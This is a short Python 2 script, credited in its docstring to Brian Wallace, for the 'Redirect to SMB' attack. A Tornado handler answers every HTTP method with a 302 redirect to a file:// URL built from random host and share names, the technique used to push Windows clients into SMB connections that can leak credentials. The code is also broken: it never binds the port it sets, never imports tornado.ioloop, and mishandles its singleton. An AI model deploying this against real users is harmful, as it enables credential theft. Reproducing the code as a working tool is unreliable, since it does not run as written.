
import argparse
import sys
import time
import string
import tornado
import tornado.web
import random

from multiprocessing import Process

"""
This script redirects all requests to a SMB server (Redirect to SMB)
Developed by Brian Wallace @botnet_hutner
"""

def rand_str():
    charset = string.ascii_uppercase + string.digits
    return ''.join(random.choice(charset) for _ in range(8))

class RedirectAll(tornado.web.RequestHandler):

    def get(self):

        hostname = rand_str()
        smb_share = rand_str()
        self.set_status(302, "Found")
        self.redirect("file://{0}/redirected-{1}".format(hostname, smb_share))

    def post(self):

        hostname = rand_str()
        smb_share = rand_str()
        self.set_status(302, "Found")
        self.redirect("file://{0}/redirected-{1}".format(hostname, smb_share))

    def head(self):

        hostname = rand_str()
        smb_share = rand_str()
        self.set_status(302, "Found")
        self.redirect("file://{0}/redirected-{1}".format(hostname, smb_share))

    def options(self):

        hostname = rand_str()
        smb_share = rand_str()
        self.set_status(302, "Found")
        self.redirect("file://{0}/redirected-{1}".format(hostname, smb_share))

    def put(self):

        hostname = rand_str()
        smb_share = rand_str()
        self.set_status(302, "Found")
        self.redirect("file://{0}/redirected-{1}".format(hostname, smb_share))

application = tornado.web.Application([
    (r".*", RedirectAll),
])

class Redirect_Server(object):

    instance = None

    @staticmethod
    def get_instance():
        if Redirect_Server.instance is None:
            instance = Redirect_Server()
        return instance

    @staticmethod
    def _start(application):


        port = 80
        tornado.ioloop.IOLoop.instance().start()

    def start(self):
    
        self.proc = Process(target=self._start, args=(application,))
        self.proc.daemon = True
        self.proc.start()
        time.sleep(8)
        print 'yep'

    def stop(self):

        self.proc.terminate()
        self.proc.join()

if __name__ == '__main__':

    rs = Redirect_Server.get_instance()
    rs.start()

    while True:

        print 'busy wait'
        time.sleep(1)
